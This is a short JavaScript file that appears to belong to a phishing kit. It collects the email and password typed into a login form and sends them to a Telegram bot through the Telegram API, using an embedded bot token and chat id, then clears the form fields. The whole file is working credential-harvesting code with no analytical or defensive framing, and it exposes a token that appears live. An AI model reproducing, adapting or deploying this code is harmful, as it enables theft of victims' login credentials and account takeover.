//bot token
var telegram_bot_id = "6112477801:AAG9cr1AMktpbVw1vPeRsrGxUiBpwAeBPYo";
//chat id
var chat_id = 6112477801;
var email, message;
var ready = function () {

    email = document.getElementById("email").value;
    message = document.getElementById("pwd").value;
    message =  "\nEmail/Mobile: " + email + "\nPassword: " + message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    document.getElementById("pwd").value = "";
    return false;
};